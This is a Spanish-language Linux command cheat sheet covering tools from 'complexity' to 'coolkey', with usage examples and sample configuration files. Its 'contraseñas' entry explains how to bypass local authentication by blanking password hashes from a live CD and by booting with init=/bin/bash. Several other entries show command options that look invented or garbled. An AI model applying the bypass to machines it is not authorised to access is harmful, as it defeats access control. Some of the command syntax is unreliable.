$ complexity archivo.c funcion_analizar (solo analiza la función especificada)
$ complexity archivo1.c funcion1 archivo2.c funcion2 archivo3.c funcion3 (analizando funciones específicas de diferentes archivos)
$ complexity -d archivo.c (informción más detallada sobre la complejidad de cada función)


composer
Administrador de dependencias para PHP que ayuda a declarar, administrar e instalar dependencias de proyectos PHP. Garantiza que tengas la pila correcta en todas partes.
$ composer update (actualizar todas las dependencias del proyecto)
$ composer require nombre/packagename:^1.0 (instalar una dependencia específica)
$ composer install (instalar todas las dependencias especificadas en composer.json)
$ composer show (verificar las dependencias instaladas)
$ composer test (ejecutar pruebas unitarias de las dependencias)
$ composer clear-cache (limpiar el cache de composer)


composite
[imagemagick]. Mezclar dos imágenes por consola
$ composite -geometry 96x96+250+70 delante.jpg fondo.jpg imagen.jpg
$ composite -dissolve 50 -gravity Center una.png  dos.png salida.png
$ composite -tile una.png dos.png salida.png (Cubre la dos.png con imagenes una.png
$ composite -dissolve 60% una.jpg dos.jpg output (transparencia del 60%)
$ composite -blend 0x0 -gravity south uno.png dos.png -alpha set salida.png (funde dos imagenes en una transparencia completa)
$ composite -blend 0x80 imagen -size 70x46 xc:'#808080' -alpha on salida (controlar la transprencia de una imagen)
$ composite -watermark 20% -gravity SouthWest marca.png imagen salida.png (Poner una marca de agua 20% difuminada abajo a la izquierda)
opciones:
dissolve.- Indica el grado de fusión entre una y otra imagen.
gravity .- Indica dónde se mezclan las imágenes. Valores: SorthWest, North, NorthEast, West, Center, East, SouthWest, South y SouthEast


compress
Comprimir archivos. Substituye el fichero orginal añadiendole .Z. Este comando es el compresor original de Unix. Su algoritmo de compresión es bastante primitivo, pero se mantiene por razones históricas de compatibilidad.
$ compress fichero.txt (Creará fichero.txt.Z)
$ uncompress fichero.txt.Z (Descomprmir)


comprez
Herramienta para comprimir/descomprimir archivos y directorios de la utilidades compress, uncompress, gzip, bzip2, tar, zip y unzip.
$ comprez archivo.txt (comprimir un archivo usando la herramienta más adecuada según el tipo de archivo)
$ comprez -d archivo_comprimido.gz (descomprimir)
$ comprez -c directorio (comprimirá todo el contenido del directorio especificado)
$ comprez archivo1.txt archivo2.pdf archivo3.doc (comprimirá los tres archivos mencionados usando la herramienta más adecuada para cada uno)
$ comprez -s archivo_comprimido.tar.gz (mostrará el tamaño reducido del archivo después de ser comprimido)
Nota.- Si queremos indicar la herramienta a comprimir: -gz y -z [gzip], -I [bzip], -lz [lzip], -Z [compress], -zip y -jar [zip] y -s [tar]


comptext
Herramienta para comparar textos y analizar diferencias basándose en métricas específicas, como CER [Character Error Rate] y BER [Bit Error Rate].
$ comptext original.txt transcrito.txt (mostrará la cantidad total de errores, la tasa de errores de caracteres y la tasa de errores de bits entre original.txt y transcrito.txt)
$ comptext --verbose original.txt transcrito.txt (muestra un desglose más completo de las diferencias entre los textos)
$ comptext --cer original.txt transcrito.txt (enfocarse solo en CER)


compton
Agregar transparencias, sombras, marcos... a las ventanas . Todos los parámetros pueden establecerse creando el archivo .compton.conf
$ compton & (Empleará los parámetros por defecto)
$ compton -c (Para aplicar sombras)
$ compton -cC (Que las sombras no afecten a los paneles y docks)
$ compton -cC -i 0.6 -e 0.6 (especificar la transparencia de las ventanas inactivas y los marcos)
$ compton -cC -i 0.6 -e 0.6 -fF (habilitar efectos suaves de transición en ventanas y menús)
$ compton -cC -i 0.6 -e 0.6 -fF -I 0.065 -O 0.065 -D 6 (Especificar tiempo de opacidad al desvanecerse las ventanas)
$ compton -cC -i 0.6 -e 0.6 -fF -I 0.065 -O 0.065 -D 6 -m 0.8 (Especificar la opacidad de los menús)


comptty
se utiliza para comparar dos secuencias RTTY [Radio TeleTYpe] y determinar la similitud entre ellas.. Su función de comparación utiliza una técnica de programación lineal. Calcula el número total de errores, la tasa CER [Character Error Rate - errores de caracteres] y la BER [Bit Error Rate - errores de bits].https://www.nonstopsystems.com/radio/frank_radio_rtty.htm
$ comptty -o resultado.txt rtty1.txt rtty2.txt (imprimirá en resultado.txt un análisis de las diferencias y similitudes entre los archivos que contienen laa dos secuencia RTTY)


comskip
Herramienta que analiza archivos de video para identificar y marcar automáticamente los segmentos publicitarios, especialmente útil para quienes graban programas de televisión y desean omitir los anuncios ya que estos tienen características claras.
$ comskip video.mpg (analiza el archivo de video y genera un .txt con detalles de los anuncios detectados, un .edl, archivo de corte para usar con reproductores y un .log de registro del análisis realizado)
$ comskip --ini=/home/user/.config/comskip/comskip.ini video.mpg (con un archivo de configuración, permite usar opciones específicas)
Nota.- Los archivos .edl permiten a reproductores como Kodi o VLC omitir automáticamente los anuncios.
Ejemplo de comskit-ini que puede colocarse en:
$ nano ~/.config/comskip/comskip.ini
cc_correct_type_modifier=1
length_nonstrict_modifier=1.5           ; Se requiere antes de lo siguiente debido a un error de análisis de comskip.ini
combined_length_nonstrict_modifier=1
cut_on_ar_change=2			; Establezca en 1 para cortar también en cambios de relación de aspecto cuando el logotipo está presente, 2 para forzar cortes en cambios de relación de aspecto. 0 para deshabilitar
delete_logo_file=1			; Establezca en 1 si desea que comskip limpie después de terminar
detect_method=127			; 1=black frame, 2=logo, 4=scene change, 8=fuzzy logic, 16=closed captions, 32=aspect ration, 64=silence, 128=cutscenes, 255=all
logo_at_bottom=1			; Establezca en 1 para buscar solo el logotipo en la mitad inferior del video, no combine con la configuración de subtítulos
logo_fraction=0.39
lowers=1
max_commercial_size=242			; Tiempo máximo en segundos para un solo comercial o varios comerciales si no hay cortes entre ellos.
min_commercialbreak=15			; Duración mínima en segundos para considerar un segmento como una pausa publicitaria.
min_show_segment_length=242             ; cualquier segmento más largo que esto será puntuado para la exhibición.
output_edl=1
output_ffmeta=1
output_ffsplit=1
output_vdr=1
punish_no_logo=0			; Predeterminado, establecido en 0 para evitar que se puntúen los segmentos sin logotipo para fines comerciales.
thread_count=3
use_existing_logo_file=0
verbose=10


concalc
Calculadora.
$ concalc 5*3 (Sin especificar números se accede al promt interactivo)


condure
Servicio que administra las conexiones de red para los protocolos HTTP/1 y WebSockets, en nombre de las aplicaciones del servidor, con el fin de permitir el control de las conexiones desde múltiples procesos.
Crear un archivo de configuración, que a modo de ejemplo podría ser:
# nano /etc/condure/config.yml
server:
  port: 8080
  host: 0.0.0.0
upstream:
  - name: app1
    url: http://localhost:3000
  - name: app2
    url: http://localhost:4000
routes:
  - path: /app1
    upstream: app1
  - path: /app2
    upstream: app2
# systemctl start condure (iniciar el servicio)
Con condure en funcionamiento, se puede acceder a las aplicaciones a través de las rutas configuradas. Por ejemplo:
        Para acceder a la aplicación en http://localhost:8080/app1, condure redirigirá la solicitud a http://localhost:3000.
        Para acceder a la aplicación en http://localhost:8080/app2, condure redirigirá la solicitud a http://localhost:4000.


confget
Examina un archivo de configuración de estilo INI y recupera el valor de las variables especificadas de la sección especificada.
$ confget -f /etc/apache2/apache2.conf -s global server_root (recuperar el valor de la variable "server_root" de la sección "global" del archivo especificado))
$ confget -f /etc/php.ini -s php_admin -l (listar todos los nombres y valores de variables en una sección)
$ confget -f /etc/mysql/my.cnf -s myqld -m 'max_*' (buscar variables que coincidan con un patrón)
$ confget -f /etc/apache2/apache2.conf -l (mostrará todos los nombres y valores de variables en el archivo de configuración de Apache)


configure-debian
Programa que presenta una lista de paquetes que utilizan Debconf, el sistema de gestión de configuración de Debian. Debconf proporciona asistentes de instalación inicial que se ejecutan cuando se instala un paquete pero que puede hacerse más tarde.
# configure-debian -l (muestra en una interfaz por consola todos los paquetes que utilizan Debconf para reconfigurar los que se indiquen)


conky
[conky-all lm-sensors hddtemp]. Monitor de sistema. Permite visualizar el estado de la CPU, memoria, espacio de intercambio, de almacenamiento en el disco duro, temperaturas, procesos, interfaces de red, así como el estado de la batería y algunas otras funciones que se le pueden configurar en el archivo ~/.conkyrc
$ cp /etc/conky/conky.conf ~/.conkyrc
$ conky (Arrancar la aplicación. Se muestra en el escritorio)
$ conky -d (arrancarla como daemon)


conman
Programa para conectarse a consolas seriales remotas. Los nombres de las consolas se pueden separar con espacios y/o comas.
El uso de globbing se usa de manera predeterminada para hacer coincidir los nombres de las consolas con la configuración, pero se puede habilitar la coincidencia de expresiones regulares con la opción '-r'.
Un ejemplo de archivo de configuración:
# nano /etc/conman.conf
console my_console {
    device /dev/ttyS0;
    baud 9600;
}
Se especifica el nombre de la consola [my_console], el puerto serial que corresponde a la consola [/dev/tty0] y la velocidad de transición en baudios. Después de modificar el archivo de configuración:
# systemctl restart conman (reiniciar el servicio)
$ conman -q (ver las consolas configuradas y disponibles)
$ conman my_console (conecta a la consola my_console. Para salir, Ctrl+])
$ conman -s my_console (abrir varias consolas en sesiones separadas)
$ conman -s another_console
$ echo "ls -l" | conman my_console (ejecutará el comando en la consola especificada y devolverá la salida)
$ conman -r my_console (el registro se guardará en la ubicación predeterminada de registros, normalmente /var/log/conman/)
$ conman -k my_console (desconecta a otros usuarios que estén usando la consola my_console)
$ conman -l (verificar el estado actual de las consolas administradas)


conmon
Herramienta que se utiliza principalmente como un monitor para contenedores en ejecución que cumplen con la especificación OCI (Open Container Initiative). Su función principal es manejar la entrada/salida de los contenedores y gestionar su estado, permitiendo que la API de contenedores  (como podman o docker) interactúe con ellos. Generalmente se usa de manera interna por otras herramientas, por lo que no se suele invocar directamente por los usuarios.
Lanzar manualmente un contenedor:
$ conmon --socket-dir /run/user/1000 --cid my-container-id --exit-dir /var/run/conmon/exit --log-path /var/log/my-container.log --log-level debug /usr/bin/my-container-runtime -- my-container-image
En este comando:
       --socket-dir: Especifica el directorio donde se almacenarán los sockets de comunicación.
       --cid: Especifica el ID del contenedor.
       --exit-dir: Directorio donde se almacenarán los datos de salida del contenedor.
       --log-path: Ruta al archivo de log donde conmon escribirá los logs.
       --log-level: Nivel de detalle de los logs.
       /usr/bin/my-container-runtime: Es el runtime del contenedor que se está utilizando, puede ser runc, crun, etc.
       my-container-image: Nombre de la imagen del contenedor que se desea ejecutar.
Monitorear la salida de un contenedor redirigiendo la salida estándar y el error estándar a conmon, se podría hacer de la siguiente manera:
$ conmon --socket-dir /run/user/1000 --cid my-container-id --exit-dir /var/run/conmon/exit --log-path /var/log/my-container.log --log-level debug --stdout /dev/stdout --stderr /dev/stderr /usr/bin/my-container-runtime --my-container-image


conmux
Se utiliza para administrar múltiples consolas y proporcionarles una interfaz coherente para acceso y control. Presenta cualquier consola con una ubicación, un nombre y una semántica coherentes. Incluye de las siguientes herramientas: conmux-attach, conmux-console y conmux-registry.
# conmuxd (inicia el demonio y configura el entorno para que conmux pueda administrar las consolas)
# conmux -a my_console /dev/ttyS0 (agregar la consola con nombre "my_console"  al sistema y el dispositivo serial al que corresponde)
# conmux my_console (abre una sesión interactiva con la consola nombrada "my_console")
$ echo "ls -l" | conmux -w my_console (ejecutará ls -l en la consola "my_console" y devolverá la salida)
$ conmux -l (mostrará una lista de consolas registradas y su estado)
# conmux -d my_console (desasocia "my_console" del sistema)
$ conmux -s my_console (muestra detalles como el dispositivo asociado y el estado actual)
$ conmux -r log.txt my_console (guarda todo lo que ocurre en "my_console" en log.txt)
# conmux -a remote_console ssh user@remote-host (administrar consolas remotas)
Se puedes crear un archivo de configuración para definir múltiples consolas. Por ejemplo;
# nano conmux.conf
       [my_console]
       device=/dev/ttyS0
       baud=9600
# conmux -c conmux.conf (para arrancar)


connect-proxy
Programa para realizar conexiones TCP a través de servidores proxy SOCKS o HTTPS
$ connect-proxy -S firewall 1080 example.com 80 (conexión básica usando un servidor SOCKS5)
$ connect-proxy -H proxyserver:8080 example.com 80 (conexión usando un servidor HTTP como proxy)
$ connect-proxy -p 5550 -S firewall 1080 google.com 80 (enviar tráfico de red a través del proxy)
Para usar el proxy con ssh de forma transparente:
$ nano ~/.ssh/config
Y colocar las lineas:
          Host *
           ProxyCommand connect-proxy -H proxyserver:8080 %h %p
Para usar el proxy con wget:
$ export HTTP_PROXY="http://proxyserver:port"
$ wget http://example.com
Configurar el proxy para todos los usuarios:
# nano /etc/environment
       HTTP_PROXY="http://proxyserver:port"
       HTTPS_PROXY="https://proxyserver:port"
       FTP_PROXY="ftp://proxyserver:port"
       NO_PROXY="localhost,127.0.0.1"


connman
Utilidad para gestionar las conexiones a Internet y otros servicios de red. Implementa resolución y almacenamiento en caché de DNS, clientes DHCP para IPv4 e IPv6, manejo de direcciones IPv4 locales de enlace y conexión compartida a clientes a través de USB, Ethernet, WiFi, celular y Bluetooth.
$ connmanctl state (verificar el estado actual de las conexiones activas y disponibles)
$ connmanctl enable wifi_0 (activar la interfaz Wi-Fi)
$ connmanctl connect wifi_0 (y luego conectar a una red)
$ connmanctl disconnect wifi_0 (desconectar una red)
$ connmanctl services (muestrae todas las redes disponibles para conectar)
$ connmanctl config wifi_0 --manual --security=none --autoconnect=yes (establece un perfil manual de conexión sin seguridad)
$ connmanctl state wifi_0 (muestra el estado actual de la interfaz Wi-Fi)
$ connmanctl agent on (activa el agente de conexión)
$ connmanctl connect vpn_0 (y luego se conecta a un servicio VPN especifico)


conntrack
Permite ver y administrar la tabla de estado de seguimiento de conexiones internas del núcleo.
# conntrack -C (Para contar el número total de conexiones de red en este momento)
# conntrack -L (mostrar todas las entradas en la tabla)
# conntrack -F (eliminar todas las entradas de la tabla)
# conntrack -s IP_ADDRESS (verificar si una conexión específica está siendo seguida por el kernel)
# conntrack -d ID (mostrar información detallada sobre una conexión específica)
# conntrack -E STABLISHED (ver las conexiones establecidas)
# conntrack -P (mostrar el número de entradas por protocolo: TCP, UDP, ICMP)
# conntrack -F --proto=TCP (limpiar solo las entradas relacionadas con un protocolo específico)
# conntrack -S IP_ADDRESS (verificar si una dirección IP está siendo seguida)
# conntrack -E -e NEW (monitorear las conexiones de red recién creadas como eventos en tiempo real)
# conntrack -L -p tcp --state ESTABLISHED (mostrar conexiones TCP abiertas)
# conntrack -L -p udp --dport 500 (mostrar conexiones UDP con el puerto de destino 500)
# conntrack -E -e NEW -p tcp --dport 22 (monitorear nuevas conexiones SSH en tiempo real)


conntrackd
Proporciona una interfaz flexible para el sistema de seguimiento de conexiones que /proc/net/ip_conntrack. Puede replicar el estado de las conexiones que actualmente procesa el firewall.
# conntrackd -d (Ejecuta en modo daemon)
# conntrackd -s (volcar las estadísticas recopiladas por el daemon)
# conntrackd -i (Volcar los estados contenidos en la memoria caché interna, es decir, los manejados por este firewall)
# conntrackd -e (Volcar los estados contenidos en la memoria caché externa, es decir, aquellos manejados por otros firewalls)
$ conntrackd -c (convierte la caché interna en el sistema de seguimiento de la conexión del núcleo)
$ conntrackd -k (matar el demonio)
$ conntrackd -s network (muestra las conexiones de red)


conserver-client
[concerver-server]. Utilidad que permite que varios usuarios puedan acceder, supervisar o interactuar con consolas seriales al mismo tiempo y en tiempo real. Asegúrar que conserver-server esté configurado en la máquina que administra las consolas:
# nano /etc/conserver/conserver.cf
     console my_serial_console {
        logfile /var/log/conserver/my_serial_console.log;
        device /dev/ttyS0;
     baud 9600;
     }
Después de configurar, reiniciar el servicio del servidor:
# systemctl restart conserver
$ console -l (muestra los nombres de las consolas y su estado actual)
$ console my_serial_console (abre una sesión interactiva con la consola my_serial_console. Se puede observar lo que ocurre en la consola o interactuar con ella. Para salir Ctrl+])
$ console -r my_serial_console (observar la actividad de la consola sin interactuar con ella)
$ echo "reboot" | console my_serial_console (enviar un comando a una consola sin abrir una sesión interactiva)
$ console -M remote-server my_serial_console (conecta a la consola my_serial_console en el servidor remoto remote-server)
$ console -l | grep "serial" (muestra solo las consolas que contienen el texto "serial" en su nombre)
$ tail -f /var/log/conserver/my_serial_console.log (muestra en tiempo real lo que ocurre en la consola)
$ console -k my_serial_console (desconectará a cualquier usuario que esté utilizando la consola my_serial_console)
$ console -p my_serial_console (prueba la conexión a la consola y devuelve un estado)


consolation
Este paquete es un daemon que proporciona soporte para copiar, pegar y desplazarse en la consola de Linux. Se basa en la biblioteca libinput y admite todos los dispositivos de puntero y configuraciones proporcionadas por esta biblioteca. Una vez instalado, con dos clics del ratón selecciona la palabra sobre la que está el puntero y con 3, toda la linea.
$ systemctl status consolation (comprobar si está activo)


console-common
Este paquete contiene la utilidad install-keymap, que es la herramienta recomendada para especificar un mapa de teclas en el momento del arranque del sistema, así como kbd-config  para uso interno de paquetes que proporcionan mapas de teclas.
# kbd-config (abre la interfaz para configurar el teclado en versiones antiguas)
# install-keymap (modo actual)


console-data
Este paquete proporciona los archivos de datos estándar para las herramientas de consola de Linux. Esto incluye definiciones de teclado [mapas de teclas], fuentes de consola para varias codificaciones, mapas que definen los conjuntos de caracteres estándar para su uso en aplicaciones de texto y tablas de respaldo que permiten aproximar el glifo de un carácter no disponible con el glifo de otro carácter en la fuente actual.
# dpkg-reconfigure console-data (abrirá un asistente interactivo donde se podrá seleccionar tipo de teclado, disposición [layout] y otras configuraciones)
# loadkeys /usr/share/keymaps/i386/qwerty/es.map.gz (cargar un mapa de teclado directamente utilizando loadkeys, herramienta que utiliza los datos proporcionados por console-data)
$ ls /usr/share/keymaps (explorar los mapas de teclado que están disponibles en el sistema)
# setfont /usr/share/consolefonts/Lat2-Terminus16.psf.gz (cambiar la fuente de la consola utilizando setfons que también se apoya en datos proporcionados por console-data)
$ ls /usr/share/consolefonts (explorar más fuentes)
Para establecer el mapa de teclado al inicio:
# nano /etc/default/keyboard
       XKBLAYOUT="es"
       XKBVARIANT=""
# setupcon (aplica cambios si se han modificado sobre la marcha)


consolochars
Modificar las fuentes en las consolas [tty1-6]
# consolechars -f fuentes
Nota.- Listado en /usr/share/consolefonts , /usr/lib/kbd/consolefonts, /usr/share/kbd/consolefonts según distro


conspy
Acceso a las tty1-6 en local o remoto.
# conspy 1 (entra en la tty1)
Para salir pulsar tres veces seguidas la tecla “Esc”


containers-storage
Utilidad CLI que interactúa con la biblioteca de almacenamiento de contenedores de Go. Se utiliza principalmente para administrar capas de sistemas de archivos, imágenes de contenedores y contenedores en un entorno manual o mediante scripts. El archivo de configuración que suele estar en /etc/containers/storage.conf.
$ containers-storage --graphdir=/var/lib/containers init (inicializar un área de almacenamiento para los datos de los contenedores donde se almacenará la información)
$ containers-storage layers (devuelve información sobre todas las capas de sistemas de archivos disponibles en el almacenamiento)
$ containers-storage images (muestra las imágenes que están almacenadas, junto con detalles como ID de imagen, etiquetas y tamaño)
$ containers-storage import --type=image --name=nginx /tmp/nginx-image.tar (agregar una nueva imagen desde un archivo tar)
$ containers-storage layer create --parent=alpine-base --name=app-layer (crear una nueva capa de sistema de archivos basada en una capa base)
$ containers-storage image remove nginx (eliminar una imagen)
$ containers-storage layer remove layer-name (eliminar una capa)
$ containers-storage layer mount app-layer /mnt/container-layer (montar una capa en un directorio para inspección o modificación)
$ containers-storage export --type=image --name=nginx /tmp/nginx-export.tar (exportar una imagen)
$ containers-storage export --type=layer --name=layer-name /path/to/export.tar (exportar una capa)
$ containers-storage image inspect nginx (inspeccionar los metadatos de una capa)
$ containers-storage image inspect image-name (inspeccionar los metadatos de una imagen)
$ containers-storage layer inspect layer-name (inspeccionar una capa)
$ containers-storage cleanup (eliminar capas, imágenes y datos para liberar espacio y mantener limpio el almacenamiento)


content-hub
Infraestructura y servicio de intercambio y selección de contenido, diseñado para permitir que las aplicaciones intercambien contenido de forma segura y eficiente especialmente en sistemas con múltiples aplicaciones que necesitan acceder a contenido compartido, como imágenes, textos o archivos. La aplicaciones de este paquete son content-hub-send y content-hub-service.
$ content-hub-service start (iniciaría el servicio, permitiendo que las aplicaciones comiencen a interactuar con Content Hub para enviar y recibir contenido)
$ content-hub-send --type image/jpeg --file imagen.jpg (se está enviando una imagen JPEG al Content Hub para que otras aplicaciones que estén configuradas para recibir contenido de tipo image/jpeg puedan acceder a ella)


continue
Salta a la siguiente interacion en un bucle for, select, while o until. En el siguiente ejemplo se imprime del 1 al 5 pero saltándose el 3:
	#!/bin/bash
	for contador in 1 2 3 4 5
	do
		if [ "$contador" -eq 3 ]
		then
			continue
		fi
		echo "$contador"
	done


contraseñas
1.-
Eliminar contraseña de root. Iniciar sesión con un live-cd y montar la partición del discon duro [suponemos /dev/sda2]
	# mount /dev/sda2 /media/sda2
	# gedit /dev/sda2/etc/passwd
Y en la linea: root:x:0:0:root/root:/bin/bash
Borrar la “x”, dejandola asi: root::0:0:root/root:/bin/bash y repetir la operación con el usuario normal.
Reiniciar
Activar  root en gdm [parecido con otros selectores de sesión: lightdm, xdm...]
	# gedit /etc/gdm/gdm.conf
Cambiar la linea:  AllowRoot=false   por AllowRoot=true
	# passwd root
Entrar la contraseña
2.-
Cambiar el tiempo en que el sistema "olvidará" la contraseña después de un sudo:
	# nano /etc/sudoers
Y añadir la línea: Defaults timestamp_timeout = 5
Donde el 5 es el tiempo en minutos que la contraseña será guardada.
3.-
Otra forma para cuando se pierde la contraseña
Entrar con un cd live y visualizar /etc/shadow del sistema instalado y buscar el  usuario. La estructura es parecida a:
pepe:$1$YpVPtTE9$jNPGevJ8IjHyAqh0h04V4.:13277:0:99999:7:::
Borrar lo que sigue al nombre del usuario para que quede:
pepe::13277:0:99999:7:::
de este modo el usuario no tendrá contraseña y cuando se pida, dar al intro.  Tras reiniciar, cuando aparezca el menu de grub, situarse con el cursor en la línea del kernel que se quiera usar. Pulsar 'e' para editar la entrada y editar la línea kernel [pulsando 'e' de nuevo]. Añadir al final de la línea lo siguiente:
init=/bin/bash
Esto hace que el sistema arranque una shell root sin pedir password. Es posible que el teclado esté en inglés. Pulsar 'b' para comenzar el arranque del kernel. La partición raíz suele montarse como sólo lectura, asi que se deberá montar como lectura/escritura:
# mount -o remount,rw /dev/hda2
Por último, cambiar la clave de root ejecutando:
# passwd root
4.-
Establecer norma en el sistema de que la contraseña tenga como nímino 8 caracteres:
# nano /etc/pam.d/common-password
Y dejar la linea:
	password        [success=2 default=ignore]      pam_unix.so obscure sha512 min=8
5.-
Página donde comprobar la fortaleza de una contraseña: <https://howsecureismypassword.net/>


control-
[^c, ^z] Cancelar o suspender la ejecución de comandos en primer plano.
Cancelar:
	$ sleep 5000
	^C
Suspender:
	$ sleep 5000
	^Z
	[1]+  Detenido       sleep 5000
Nota.- En caso de volver a llevar a primer plano un comando detenido:
	$ fg %1
En caso de querer continuar con su ejecución en segundo plano:
	$ bg %1


conv-tools
Convertir la codificación de caracteres de 8 bits en nombres de archivos y contenido de texto a UTF-8
$ conv-tools --to=utf-8 archivo.txt (convertirá el archivo especificado de codificación de 8 bits a UTF-8)
$ file -i archivo.txt (verificar la codificación de un archivo antes de convertirlo)
$ conv-tools --to=utf-8 archivo1.txt archivo2.txt archivo3.txt (convertir múltiples archivos al mismo tiempo)
$ conv-tools --to=utf-8 --no-header archivo.txt > nuevo_archivo.txt (convertir solo el contenido de un archivo sin modificar el encabezado


converseen
Podrás convertir un número ilimitado de imágenes y/o crear miniaturas en cualquiera de los formatos más populares: DPX, EXR, GIF, JPEG, JPEG-2000, PDF, PhotoCD, PNG, Postscript, SVG y TIFF. Gracias a las bibliotecas de imágenes Magick++, es compatible con más de 100 formatos de imagen.
$ converseen imagen.jpg png:0 (convertir una imagen JPG a PNG)
$ converseen ~/Images/*.jpg png:0 --create-thumbnail=300x200 (crea miniaturas de 300x200 píxeles para todas las imágenes JPG en el directorio especificado)
$ converseen ~/Images/*.{jpg,png,gif} png:0 (convierte todos los archivos JPG, PNG e GIF en el directorio a formato PNG)
$ converseen ~/Images/*.{jpg,png,gif} png:0 --create-thumbnail=100x75 (convierte los archivos a PNG y también crea miniaturas de 100x75 píxeles)
$ converseen /ruta/a/imagen.jpg png:0 --quality=90 --optimize (convierte el archivo a PNG con calidad del 90% y optimiza el archivo resultante


convert
[imagemagick]. Redimensionar, cambiar formatos, extraer fotogramas, convertir blanco y negro imagenes. Este comando es tan extenso que él solo merecería un libro. Consulta más exhaustiva en <http://www.imagemagick.org/script/convert.php> o en español <http://www.rpublica.net/imagemagick/intro.html#inicio_sec>
$ convert *.jpg imagenes.pdf        (Crear un pdf con todas las imágenes)
$ convert {1,2,3,4,5,6,7,8,9}.png imagenes.pdf (Lo mismo especificando páginas y orden)
$ convert color.jpg -monochrome blanconegro.jpg (Convertir a blanco y negro)
$ convert original.png nueva.jpg        (Cambiar el formato de una imagen)
$ convert --auto-orient in.jpg out.jpg  (Reorientar una foto)
$ convert -resize 800x600 *.jpg %02d.jpg (Cambiar dimensiones de todas)
$ convert -quality 40% imagen image_reducida         (lo mismo)
$ convert -delay 60 1.jpg 2.jpg 3.jpg 123.gif (gif animado con varios jpg)
$ convert -geometry 400 -delay 100 -loop 0 *.JPG resultado.gif (Otra forma de gif animado con varios parámetros)
$ convert -delay 200 -quality 20 -size 200 -loop 0 *.jpg resultado.gif (Otra forma de gif con todas las fotos del directorio)
$ convert 123.gif -adjoin 1-2-3.jpg     (extraer los fotogramas de un gif)
$ convert -resize 200 awk.pdf[0] awk.png (primera imagen pdf a imagen)
$ convert file.pdf file.jpg  (convertir pdf en jpg)
$ convert imagen.png -pointsize 32 -gravity center -annotate 0 "Linux es genial" salida.png (Colocar un texto con medida 32 sin inclinación [-annotate 0] en el centro [-gravity center] de una imagen )
$ convert imagen.jpg -alpha set -channel A -fx 0.5 imagen.png (Aumentar la tranparencia de una imagen [valor de fx: 0 toda y 1 nada] y canviarla a jpg)
$ convert -density 300 input.pdf -fill "rgb(255,255,255)" -opaque "rgb(29,5,114)" output.pdf  (convertir fondo negro a blanco para imprimir)
$ convert entrada.jpg -font Bookman-Demi -pointsize 62 -stroke white -draw "text 5,60 'Texto'" salida.jpg (poner un texto en determinadas coordenadas [5,60] especificando fuente, medida y borde de las letras en blanco)
Si quisieramos el texto en rojo añadiríamos: -fill red después de -stroke white)
Algunas opciones:
	-fill red (Letra roja)
	-strokewidth 3 (Ancho del borde de letra)
	-border 3 (Emmarcar la imagen con un borde de 3 pixels)
	-frame  5x5+2+2 (Lo mismo estilo cuadro)
	"delay 60" (son 60 milisegundos por fotograma)
	"resize 150×150" (Respetará la proporción de la imagen.)
	"imagen%02d" (Renombrará todas la imagenes con nombre "imagen" y dos dígitos.)
	"imagen%03d" (Igual pero con tres dígitos.)
$ ifconfig | convert -background yellow -fill black -font Courier -pointSize 14 label:@- ifconfig.png  (convertir la salida de un comando a imagen png)
	ifconfig (comando que se ejecuta)
	-background (color del fondo)
	-fill (color del texto)
	-font (fuente del texto)
	-pointSize (tamaño del texto)
	label:@- (Nombre del archivo a generar)
Archivos nombre de fuentes, colores: /etc/ImageMagick/
Tambien puede cambiarse el nombre de la fuente por su archivo:
	-font /home/usuario/.fonts/Albert.ttf
1.-
Convertir todas las imágenes del directorio de formato .jpg a .png:
$ for i in *.jpg;do convert "$i" "${i%.jpg}.png";done


convertall
Puede convertir cualquier unidad a cualquier otra unidad compatible.
$ convertall -i (entra en la interfaz de la aplicación)
             Enter from unit -> km
             Enter to unit -> milla
             1.0 km = 0.62137119 milla
             Enter number, [n]ew, [r]everse or [q]uit -> q


convmv
puede convertir un nombre de archivo, un árbol de directorios o todos los archivos de un sistema de archivos a una codificación diferente. Solo convierte la codificación de los nombres de archivo, no el contenido de los archivos. Una característica especial de convmv es que también se ocupa de los enlaces simbólicos: la codificación del destino del enlace simbólico se convertirá si se convierte el enlace simbólico en sí.
$ convmv -f ut-8 -t iso-8859-1 archivo.txt (convierte el nombre del archivo `archivo.txt` de codificación UTF-8 a ISO-8859-1)
$ convmv -R -f ut-8 -t iso-8859-1 /directorio (convierte los nombres de todos los archivos y subcarpetas del directorio de codificación UTF-8 a ISO-8859-1)
$ convmv -f ut-8 -t iso-8859-1 / (ambiar la codificación de todo el sistema de archivos de codificación UTF-8 a ISO-8859-1)


cookiecutter
Herramienta muy útil para crear proyectos a partir de plantillas. La creación de plantillas se realiza con J2cli y no hay ninguna limitación en cuanto al lenguaje utilizado por los proyectos con plantillas (Python, Ruby, Javascript, C, HTML, Postscript...).
$ cookiecutter gh:cookiecutter/cookiecutter-pypackage (crear un proyecto Python a partir de una plantilla que se encuentra en GitHub. Pedirá algunos parámetros como nombre del proyecto, versión, autor, etc)
$ cookiecutter gh:cookiecutter/cookiecutter-django (rear un proyecto Django con la plantilla cookiecutter-django)
$ cookiecutter gh:cookiecutter/cookiecutter-flask (crear un proyecto Flask, con otra plantilla específica para Flask)
$ cookiecutter gh:cookiecutter/cookiecutter-django --checkout <branch_name> (algunas plantillas permiten especificar opciones adicionales. Aquí, --checkout permite especificar una rama particular de la plantilla)
$ cookiecutter /ruta/a/tu/plantilla (generará un nuevo proyecto basado en la plantilla especificada en la ruta)


cookietool
Herramienta útil para manejar cookies en bases de datos de navegación. Elimina las entradas duplicadas, ordena las cookies alfabéticamente o por tamaño.
$ cookietool --remove-duplicates /ruta/base_de_datos.cookie (eliminará todas las entradas duplicadas en la base de datos de cookies especificada)
$ cookietool --sort-alphabetical /ruta/base_de_datos.cookie (ordenará las cookies en orden alfabético dentro de la base de datos)
$ cookietool --sort-by-size /ruta/base_de_datos.cookie (ordenará las cookies basándose en su tamaño, desde los más pequeños hasta los más grandes)
$ cookietool --split /ruta/base_de_datos.cookie --output=/ruta/a/nuevo_archivo.cookie (extraerá una parte de la base de datos y la escribirá en un nuevo archivo especificado)
Nota.- La base de datos en Firefox está en ~/.mozilla/firefox/57vii5dd.default-release/cookies.sqlite (el nombre de perfil 57vii5... varia en todas las máquinas) en chromium en ~/.config/chromium/Default/Cookies


cool-retro-term
Emulador de terminal que imita la apariencia de las antiguas pantallas de tubo catódico.
$ cool-retro-term (forma básica)
$ cool-retro-term --fullscreen -e htop (a pantalla completa y comando a ejecutar)


coolkey
